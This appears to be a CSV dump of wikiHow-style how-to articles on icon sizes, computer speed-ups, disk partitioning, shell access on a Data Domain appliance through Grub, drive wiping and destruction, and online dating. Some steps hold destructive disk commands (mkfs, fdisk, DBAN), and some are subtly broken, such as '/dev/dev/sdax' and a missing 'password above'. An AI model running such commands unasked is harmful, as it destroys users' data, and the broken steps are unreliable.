headline,title,text
"
Right-click an empty area of the desktop, then select “Show View Options”.,
Move the slider beneath “Icon Size” to the left.,
Click the red “Close” button at the top corner of the window to commit your changes.",How to Make Desktop Icons Smaller2," A dialog box will appear containing desktop customization options.

, The current icon size is displayed (in pixels) next to “Icon Size” at the top of the window (e.g., 48 x 48). As you move the slider to the left, the Icon Size value will decrease.


The smaller the number, the smaller the icons.
The smallest possible icon size is 16 x 16, and the largest is 128 x 128.

, If you are dissatisfied with your changes, return to the View Options and try a different size.

"
"
Right-click an empty area on the desktop, then click “Properties”.

,
Click Advanced.

,
Select ""Icon"" from the “Item” drop-down menu.

,
Enter a smaller number into the “Size” field.,
Click “OK” to save your changes and return to the desktop.",How to Make Desktop Icons Smaller3,",,, To the right of the Size field (which contains the current icon size in pixels), you will see two arrows—one pointing up, the other down. Click the downward-pointing arrow to decrease the number.

, If you are dissatisfied with the new icon size, return to the Advanced screen and adjust the size.

"
"
Open the Settings app, then select “Display and Brightness”.While there’s no way to customize the size of your icons on your iPhone or iPad, there is a way to fix the issue of your device having abnormally large icons.,
Look at the entry for “View” beneath “Display Mode”.There are two possible options here:


Standard: If the view is set to “Standard”, your phone is not in Zoom Mode, and you won’t be able to make the icons smaller.,
Tap “Zoomed” (if present).,
Tap “Standard”, then tap “Set”.",How to Make Desktop Icons Smaller4," If your device wound up in Zoom Mode, it’s easy to turn it off.


If the icons are too large to navigate to the Settings app, double-tap the screen with three fingers to zoom out, then try again.

,
Zoomed: If it is set to “Zoomed”, changing it to “Standard” will reduce the icon size.

, Now you will see a new screen that says “Display Zoom” at its top.

, This will reduce the home screen (and the icons) to its normal, smaller size.

"
"
Tap and hold your finger on a blank area of the desktop.Some manufacturers include the ability to customize icon size in their versions of Android.On some Sony phones (and possibly others), this action will open a toolbar at the bottom of the screen.

,
Select “Home Settings” or “Desktop Settings”.

,
Tap “Icon Size” to view size options.,
Select “Small”, then navigate back to the desktop to view your changes.

",How to Make Desktop Icons Smaller5,",, Some phones will have two options—small and large—while others may allow you to be more specific in your customization.

,"
"
Check your hard disk space first.,
Remove any programs you do not use.,
Prevent unnecessary programs from starting when the computer boots up.,
Change the power plan of your desktop computer to High Performance.,
Remove any unnecessary entries from the Windows Context Menu.,
Install an anti-virus program, spyware scanner, and an anti-malware.,
Run a Disk Cleanup.,
Run a Disk Defragment.,
Disable visual effects.,
Add RAM to your computer.,
Remove gadgets you don't use.,
Clear temporary files on your computer.,
Consider upgrading your computer's hardware.",How to Make Your Computer Run Faster2," Go to My Computer, right-click Local Drive, then click Properties. There you'll see a pie chart of your free versus used space. If the disk is mostly full, you will need to remove programs and files; if there's still plenty of room, there may be something wrong with your operating system.


As a rule, you want to keep at least 15% of the hard disk space free to keep the computer running smoothly.
If you find you simply need more space, consider buying and installing a Solid State Drive (SSD) to complement or replace your hard disk. They are faster and much more secure than hard drives.;
, Go to Control Panel, then click Add or Remove Programs (or ""Uninstall a Program"", depending on your operating system) to find a master list of programs installed on your computer. Some things will strike you as useless immediately, in which case you can remove them right away. Others won’t look familiar to you and may require some research.


It may help to see how often you use the program. If you right-click one of the column titles above your program list, you should be able to add additional characteristics by which to organize your programs. Check Last Used On and a column displaying the last time you used each program will appear. This will quickly show you which programs you use frequently and the ones you haven't used in years.
Don't forget to empty your recycling bin.

, Some programs may start as soon as you turn on your computer, running in the background so they will load quickly when you open them. Open the Start Menu and run a search for ""msconfig"". Click on Startup to see a list of all the programs that run when you boot up your computer and uncheck anything unnecessary.


You can also check the taskbar to see which programs are running on start up (be sure to click Show Hidden Icons so you don't miss any).

, Go to the Control Panel and select Power Options. You will find a list of power plans, usually Balanced, Power Saver, and High Performance. These settings control how your computer uses power--either by lowering performance to optimize battery life, maximizing performance with major power consumption, or a balance between the two. Selecting High Performance may increase the speed and overall performance of your computer.This is only helpful if you have a desktop PC--using the High Performance setting on a laptop will drain your battery power.

, The context menu is the menu that pops up when you right-click something. Sometimes programs will ask to be added to the menu, others will add themselves automatically. To remove programs, press ⊞ Win+R to open the Run box. Type in regedit and click OK.Click HKEY_CLASSES_ROOT → * → shellex → ContextMenuHandlers. From this list, delete the applications you don't want to be included in the context menu.


Be extremely careful whenever editing something using the Registry, as using it incorrectly can damage your system. If you're not comfortable using regedit, try searching for freeware that will allow you to edit your Context Menu.

, The fewer bugs, viruses, and bits of adware your computer has to manage, the more time it will have to devote to other processes.Keep Windows up-to-date. Not only will this keep Windows itself running smoothly, but some viruses ride in on Windows updates that are downloaded long after the update is available (and therefore are not monitored as closely)., This can clean up hundreds of megabytes by deleting temporary files, unnecessary system files, and emptying your recycling bin.Click My Computer, right-click Hard Drive, then click Properties. Click Disc Cleanup (within the General tab). A window will pop up asking which files you'd like to remove. Check those you wish to delete and run the cleanup.You'll want to keep any game files (unless you want to delete your saved games) and setup files.
If you have multiple drives or a partition, you must select the one you want to be cleaned., When data is fragmented, your computer must search for the fragments of files that could be spread all over your hard drive. Defragmenting will organize your data and free up space so your computer can access data faster.Click My Computer, then right-click Hard Drive. After you have right-clicked, click Properties, Tools, then click Defragment Now.


Fragmented data can be on your hard disk or removable drives, like USB and flash drives., There are 20 visual effects you can turn off or on. To turn off all effects and maximize performance, click Control Panel, System, then click Advanced System Settings. Select the bullet which says ""Adjust for best performance"".If you don't want to sacrifice all the visual flair, try selecting the option which says, Let windows choose what's best for my computer., To see if you need more RAM, initialize the Windows Task Manager by pressing Ctrl+Alt+Del. Under the Performance tab, find the area devoted to Physical Memory (MB). If the number next to ""Available"" is less than 25% of the Total MB, you may need to add RAM.Adding more memory may not necessarily make your computer run faster. If your computer is slow to switch between windows or tasks, or if you often have many browser tabs open at once, additional RAM may help.You can take your computer to an expert to add RAM, like the Geek Squad at Best Buy, or you may decide to add more RAM yourself. Just be sure to do your research before attempting to do it on your own.

, Right-click on the desktop and click Gadgets. Right-click on the gadget you wish to delete and click Uninstall., Your computer generates a lot of temporary files each time you boot up and/or use applications. This takes up a considerable amount of space, further slowing down your system. You should clean it whenever you think your PC is slowing down more than usual. To do this, press ⊞ Win+R and then type ""%temp%"" (without the quotes). Permanently delete (⇧ Shift+Delete) all the files present in the folder. Just skip the files that the system says it was unable to delete., It could be that your computer is running slow because of the old hardware that is running the newer software. When a computer was released the hardware was designed to run a specific OS or software versions. When newer versions of the software was released it was supported by the older hardware but just. The reason your computer may be running slow or freezing is because the older hardware is struggling to keep up with the newer software. Try replacing parts and this may speed your computer up"
"
Check your hard disk space.,
Use your Activity Monitor to find out which applications are using the most memory.,
Uninstall unnecessary programs.,
Delete, compress, or remove large and unnecessary files.,
Prevent unnecessary programs from starting when the Mac boots.,
Repair disk permissions.,
Remove unnecessary dashboard widgets.,
Remove unused languages.,
Add more RAM to your computer.",How to Make Your Computer Run Faster3," Go to the Apple menu (the Apple icon in the upper left corner of your screen), then click About This Mac, More Info, then Storage. This will show you how much free space you have on your hard disk and will also break down your current usage, showing you how much space is used by your movie, music, photo, and app files.Learning what type of files are taking up the most space will give you a starting point for what you should remove (either by deleting or moving to external storage). If you find that your massive music collection is taking up almost all of your space, you can solve your problem quickly by transferring your iTunes library onto an external drive.
Try to keep at least 15% of your drive free so that your computer can run general maintenance.If you never seem to have enough space on your hard disk, consider buying and installing a Solid-State Drive (SSD). They are generally sturdier and run much faster than hard drives, so your computer will zip along like new., Go to Library, Applications, then click Utilities. Launch the Activity Monitor by clicking it from the list. Select the % CPU column and see which programs are at the top. If it is using anything over 50%, running that program may be slowing everything down.If you discover that one particular application is slowing down your Central Processing Unit (CPU), you can speed things up by deleting that application and using a faster alternative, or closing all other programs every time you use that application.
Safari is often at the top of the list for CPU. Consider switching to a different browser, like Firefox or Chrome., You can either uninstall them manually by dragging apps into the trash or by downloading a program to help you sort and delete them.

iMovie, Garage Band and iPhoto are large programs that many people don't use, and are a good place to start.

When in doubt, don't remove anything you don’t recognize: it may be critical to the function of your computer or another application.

, You can search for large files by opening Finder and pressing ⌘ Command+F to search. Click on the Kind button and select Other. Scroll down to where it says Size and check the box to include it ""In Menu"" and click OK. Once that is done, you can search for large files--try ""files greater than 200 MB to begin with"". Delete, compress, or move any files you want to save to your back up drive.


To compress something, click the item while holding down the Ctrl button and choose Compress. Double-clicking the zip file will decompress the item.
Open the Downloads folder. Make sure you are viewing files as a list and then click on the Size header so that your largest files are on top. Get rid of anything you don't need.Movies are generally the largest files--they can be between 1-2GB. Consider removing anything you are not watching or plan to watch soon.Remember to empty your trash bin. If you delete photos in iPhoto or Aperture, you must empty the trash bin that exists in that program, or else the files will not be deleted., The more programs trying to start up while your computer initializes, the slower everything will be. From the Apple Menu, go to System Preferences, Accounts, then click Login Items. Select any items you don’t need and click the minus (-) sign to remove them.


Clearing your desktop of icons will also speed up the process, as the computer must load these items when starting up. Move the files on your desktop into folders or delete icons, and try not to download things directly to your desktop. , Go to Applications, Utilities, then click Run Disk Utility and select your startup disk. Then select First Aid and click Repair Disk Permissions. In running this procedure, your computer will search the permission settings on your hard drive to make sure files are accessible only to the users and applications that have permission to do so.Always restart your computer after running disk repair.


If your disk permissions are not properly set, you may have trouble with some of the basic operations on your computer, such as printing, logging in, or opening programs.It is suggested you run this procedure every few months to catch any potential issues before they interfere with your computer usage., Even if you don’t have the dashboard activated, these widgets can eat up RAM by running background updates while you try to do other things.


If you have OS X 10.4.2 or later, use the Widget Manager: go to the Dashboard and open the Widget Bar by clicking the plus (+) sign in the corner. Click Manage Widgets and then either deselect widgets to disable them or, if they’re third-party widgets, remove them completely by pressing the red delete button, which is a circle with a line through it. Click OK to confirm.

, If you use Mac OS X, download a free program called Monolingual. With OS X, much of your computer’s hard disk is devoted to virtual memory and gets eaten up by language-availability software. Monolingual will allow you to remove languages you don’t use in order to free up space.


No matter which language you use, never delete the English language files. Doing so may cause OS X to malfunction., This may be especially helpful if your computer is slow when opening applications or switching between running programs.To see if you need more RAM, open the Activity Monitor (Library → Applications → Utilities) and click System Memory. Look at the colors of the pie chart: if it's mostly green and blue, your RAM is fine. If the pie chart is mostly red and yellow, you should consider installing more RAM.To see what kind of RAM your Mac uses, go to the Apple menu, then click About This Mac, then More Info. Under Memory in the Hardware tab, you can find the memory, size and type of RAM your computer uses.If you choose to install the RAM yourself, search for ""RAM"" and your computer type on the Apple support page. Apple provides instructions for installing RAM on many of its computers. "
"
Open the Disk Management utility.,
Manage your unallocated space.,
Create the new partition.,
Format the volume.",How to Create a Partition1," Open the Run dialog box from the Start menu or by pressing ⊞ Win+R. Type diskmgmt.msc and press ↵ Enter. This will open a window that allows you to manage all of the volumes and drives installed in your system.On Windows 8 or higher, press ⊞ Win+X or right click on the Start button, and then choose Disk Management.;
, Partitions are created from unallocated space or free space on your hard drive. You can create more unallocated space by shrinking an existing volume. This will remove the available storage space from that volume and turn it into unallocated space.


Right-click a volume and select ""Shrink Volume..."" to begin the volume shrinking process. You will be able to choose how much of the free space you want to remove from the volume to turn into unallocated space.
You won't be able to turn all of the available storage into unallocated space because some of that available storage is reserved for unmovable files. You can increase the space you can reclaim by defragmenting the drive first.
If you want to merge two blocks of unallocated space together, you will need to use a tool like GParted or Partition Manager.

, Right-click on the unallocated space and select ""New Simple Volume"". This will open a wizard that will walk you through the steps to create the new partition.


Set the size. The first thing you will be asked is how big you want the partition to be. By default, it will be set to the same size as the entire block of unallocated space, but you can choose to make it smaller if you wish. Any unused space will remain unallocated.
Assign a drive letter. All partitions need a drive letter, which allows them to have addresses for files located on the partition. You can choose any letter that you'd like as long as you don't already have a drive using that letter. Avoid using A: and B: as these are older drive letters reserved for floppy disk drives.

, Ensure that the volume is set to be formatted, otherwise you cannot use it to store files. If you are using the volume to store files for Windows, set the file system to NTFS. Enter a name for the volume in the ""Volume label"" field.Check the ""Perform a quick format"" box unless you are worried that the disk is damaged.
If you are going to be using the volume to install an operating system on, you don't have to worry about formatting it now.

"
"
Connect a VGA monitor and PS2 keyboard to the appliance.
,Log on as the sysadmin user.,Type ""system reboot"" to restart the appliance.,
Press the DEL key during POST to enter the BIOS if required.,
Press the P key while the Grub boot menu is shown.,Press the E key to (temporarily) edit the boot entry.,Press the down arrow key to select the 'kernel' line.,Press the E key to edit the kernel parameters.,
Add ""goto-bash"" to the end of the line.,Press Enter when you are done editing the line.,Press the B key to continue booting.,Instead of booting normally, the appliance will enter a state similar to single user mode on a normal Linux computer.,You will have a Bash prompt and can mount the rest of the file systems and examine things from there.,Restart the appliance to return to normal operating mode.","How to Access the Bios, Grub Boot Menu and Bash Shell of a Data Domain Appliance",",,, Use the password above., Use the password above.,,,, Make sure to add a space between the existing kernel parameters and ""goto-bash"".,,,,,"
"
Download Darik's Boot and Nuke (DBAN) here.,
Burn DBAN to a CD.,
Boot from the CD.,
Delete the data.",How to Permanently Erase Data Off a Hard Drive1," Two different versions (one for PCs and newer Macs, and the other for older Macs) allow DBAN to work on nearly every computer made within the last ten years.;
, Since DBAN is an ISO file, you will need to use burning software that can burn ISO files (also known as CD images). Simply burning the file onto a CD in the ordinary way is not sufficient. If you don't see the ""ISOLINUX"" folder on the burned CD, it won't work and your hard drive will not be erased.


Windows 7 comes with the correct software to burn ISO files; simply double-click the file. If you are using an older version of Windows, download a program such as BurnCDCC if you don't have suitable CD burning software.

, Leave the CD in while you restart the computer you are erasing the hard drive with. If it doesn't boot up from the CD automatically, you will need to adjust the boot order in the BIOS. On an Apple Mac, you may need to hold down the ""C"" key while the computer starts up.

, You will need to select the disk to delete the data from (make sure it is the right one because you can't recover the data after it has been destroyed). You can choose how many times you want it to be overwritten and deleted. The default, 3-pass overwrite is far more than needed. Overwriting with ""one pass of random data"" is sufficient to prevent any recovery of data.

"
"
Open the Disk Utility program.,
Select your hard drive.,
Shrink the existing partition.,
Create a new partition.,
Change the size of the partition.,
Select a file format.,
Apply your changes.",How to Create a Partition2," You can access Disk Utility from the Utilities folder in the Applications folder. Disk Utility comes installed on every Mac.


Note: This method only works on OS X 10.5 (Leopard) and above. Users of older versions will need to use partition software to create a new partition from an existing one.

, In the left frame, select the hard drive that you want to create a partition on. Click the ""Partition"" tab to view the partitions on the drive. You will see all of the current partitions on that drive laid out in the right side of the window. Used space is represented as light blue, while free space is represented as white.

, Select the partition you want to shrink and then either enter in the new size you want into the field or click and drag the bottom-right corner of the partition block. Click Apply and then Partition to save the changes.


You won't be able to shrink it into the blue area, as this represents files that exist on the original partition.

, After resizing your original partition, click the ""+"" button at the bottom of the Partition Layout window. A new partition will be created out of the available space left after shrinking the original and added to the partition layout.

, By default, the new partition will take up all the available space left over after resizing. You can adjust the size of the partitions by using the slider between the two in the Partition Layout window. You can also select a partition and enter the size you want it to be in the ""Size"" field.

, The original partition will keep its old file system, but you will need to format the newly created partition in order to start storing files on it. Choose ""Mac OS Extended (Journaled)"" from the Format drop-down menu.


If you're creating a partition to install Windows on, leave it unformatted for now. The Windows installer will format it to the correct file system.
Give the new partition a name so that you can easily identify what's on it.

, Click the Apply button, and then click Partition to accept your changes and create the new partition. You can now use your new partition just like you would any hard drive."
"
Download a partition tool.,
Resize your existing partition.,
Create a new partition.,
Format the new partition.,
Repair your boot record.",How to Create a Partition3," There is no way to shrink a volume in Windows XP, which means that you can't create a partition out of the free space on your hard drive. You will need to use a partition utility like Partition Wizard or GParted to shrink your existing volume., Use the partition tool you downloaded to resize one of your existing partitions. The amount you can shrink the partition is based on the location of unmovable files, and this amount can be increased by defragmenting your hard drive.


See this guide for details on using GParted to change your partition size.
See this guide for details on using Partition Manager to change your partition size.

, Once you've resized your old partition, you will have a chunk of unallocated space. You can use this to create your new partition. You can either use all of the available unallocated space or you can set it to a portion of it.


You can either create the partition using the partition tool that you downloaded, or you can use Windows Disk Management as described in the first section.

, Before you can use your new partition, you will need to give it a file system and a label.

, If you resized your operating system's partition, it could cause Windows to not be able to boot. In order to fix this you will need to perform a repair installation of Windows. You will need the Windows XP installation disc for this process.


See this guide for detailed instructions on repairing your Windows XP installation.

"
"
First unmount the partition that you would like to format.,
To format the partition that you unmounted, simply run the command: sudo mkfs.ext4 /dev/dev/sdax

This will create an ext4 filesystem on /dev/sdax.",How to Create a Partition4," Assuming that /dev/sdax is the partition that you want to format, run the following command to unmount it: sudo umount /dev/sdax

Note: You cannot unmount the root partition while the system is running.Use a live cd or live usb to format the root partition. /dev/sdax must be replaced by the appropriate partition name. Use sudo fdisk -l to get the list of partitions on your system. For instance, to format /dev/sdb2, use sdb2 in place of sdax.

, Please note that this will erase all data on the partition.
Note: Linux supports several filesystems. You may use btrfs, xfs or even reiserfs.

"
"
Using fdisk

To get a list of the disks attached to your computer and the partitions on them, run sudo fdisk -l.
To get the list of partitions on /dev/sdb, run sudo fdisk /dev/sdb -l.
To create a partition on the disk /dev/sdb, first run the command sudo fdisk /dev/sdb.",How to Create a Partition5,"
After you type in your password and press enter, you will get a prompt like the one in the image below.






Type in n.
You will be prompted to select the partition type. Enter p for creating a primary partition and e for creating an extended partition.
Next you will be prompted to select the partition number, first sector and last sector. Just press enter and go with the default choice.






You have successfully created a new partition.
To create a new partition, there must be enough free space on the disk. To shrink the first partition on the disk /dev/sda by 200MB, use the command sudo resize2fs /dev/sda1 200M. Replace M by G to specify size in gigabytes.

"
"
Remove the old hard drive you want to destroy from the computer or external enclosure (such as the outer case around a USB hard drive).

,
Unscrew all the screws holding the top on.,
Destroy the platters.",How to Permanently Erase Data Off a Hard Drive2,", You will need the T-9 sized wrench for most hard drives. Sometimes there's an air seal. You will need to remove this.

, Once you get the top off you will see two or three stacked, silver disks (called platters). Put scratches on the surface of the platters with the Torx wrench. Now start smashing it with the hammer. Do this outside on a hard surface (such as concrete). Be sure to wear safety glasses to protect against flying debris. Glass platters (found on newer drives) will shatter. If you have a large hammer (a 10 lb sledge for instance): you can forgo opening the drive - a few good hits with a big hammer can split open the metal casing and mangle the platters, even on old full height 5.25"" drives with metal (rather than glass) platters.

"
"
Windows



Microsoft SDelete: Secure delete files, directories or sanitize free space.,
Mac OS X


Permanent Eraser: Can be used as an alternative to the ""Secure empty trash"" option.,
Linux (Ubuntu)


Wipe Package from Ubuntu Unleashed: Adds secure multi-pass file deletion, like DeleteOnClick does in Windows.

",How to Permanently Erase Data Off a Hard Drive3,"
Wipe File: Overwrites the specific disk space occupied by the file you'd like erased.
DeleteOnClick: Has a ""Securely Delete"" option to engage a Department of Defense 5220.22-M overwrite on the files.
Eraser: Can be scheduled to perform regular overwrites of empty disc space to catch orphan files.
WBD(Wipe Bad Disk): Can wipe disks with bad sectors.

, It overwrites the files 35 times.
Disk Utility: Integrated in Mac OS X. It has an ""Erase Free Space..."" function that writes over the unused space 1, 7, or 35 times.
srm: Terminal command that deletes and overwrites files making recovery impossible.

,"
"
Realize that you're going to experience some rejection and steel yourself for it.,
Ignore much of the advice you read in mainstream books on internet dating.,
Listen to the whispers of your soul.,
Be proactive.,
Think about the note you're writing.,
Develop a system.,
Do not post a picture.,
Write a good profile.,
During your first date, don't talk so much.,
During phone conversations or that first date, don't fear the silences.,
Write out a mission statement.,
The most important thing you can do: Be persistent.",How to Find a Good Man if You're Less Than Beautiful," Sadly, many single men are just small-minded, hormone-driven, testosterone-poisoned pigs and they're on the internet looking for a babe. Don't take these rejections from piggies too personally. These aren't the guys you want. You want a man of substance, not someone who's looking for a trophy babe.;
, Most of these are written by, and for, the beautiful people. Contrary to what these books advise, Do NOT market yourself. For instance, do not act passive and demure if you're not a passive and demure person. Do not pretend to be anything that you're not. Personality comes from a Latin word, used to describe the mask that actors wore during a performance. Take off the masks. Stop playing a part and start being authentic and real.

, If you get a bad vibe from a guy, listen to that nudging from within and end the date or end the relationship. And read, ""The Gift of Fear"" by Gavin deBecker. It's a book that teaches how to pay attention to the intuitive suggestions that come from our ""wired-to-survive"" self hood.

, Men at the internet dating sites don't get that many well-written, intelligently worded emails from single women. Don't wait for your inbox to fill up. Get out there and do a little shopping. Find a profile that sounds intriguing and write Mr. Wonderful a nice note.

, Write something thoughtful. Write something intelligent. Write something that is an accurate reflection of who you really are. Invite them to respond by asking questions. Be intriguing with a dash of mystery. And follow the rules of writing good advertising copy: Leave plenty of white space. In other words, don't blather on. Sell the sizzle, not the steak. That first email is just a tickle under his nose. It's the tempting offer that he can't refuse.

, Keep notes. Anything that's done in a thoughtful, systematic and persistent way has a far better chance of success, than a scattered, halfhearted attempt. Invest your best energies in this. If you're successful, you'll have a happy-ever-after of your very own. That's an important goal and worthy of your best efforts.

, Yes, this runs contrary to most advice but this advice is born of practical real-life experience. When you write an introductory email to your potential suitor, use words to paint a picture that is irresistible. As Robert Frost said, ""Love is the irresistible desire to be irresistibly loved."" Use words to make yourself irresistible.

, More than 95% of profiles begin with, ""I am a,"" or its low-rent cousin, ""I want a..."" If your profile begins with something other than this, you're already ahead of the game. Start with a favorite quote, or a funny story or a real-life adventure.

, You're not there for a free chat session with a captive listener. You're there to learn and the only way to learn is to be quiet and listen. Ask a few poignant questions and pay attention to the answers.

, Silence is a newspaper reporter's best tool. Most people fear the silences and rush in with words to fill silences. And they're *always* interesting words. When there's a silence, count to ten or do whatever you need to do and just remain quiet. Intelligent, well-educated people know about The Silence and know how to just sit quietly and smile. Be one of *those* people.

, Make it detailed and thorough. Think about the spiritual and emotional qualities you want in a man and then list those qualities. This is very important. St. Augustine said, “The desire of your heart is itself your prayer. And if the desire is constant, so is your prayer.” Put that desire into words: write a mission statement

, Perhaps true love doesn't come as easily to us ""less than beautiful"" women as it does to the beauties in the world, but it will arrive if you give it time. Don't give up, or as Winston Churchill said, ""Never, never, never give up.""

"
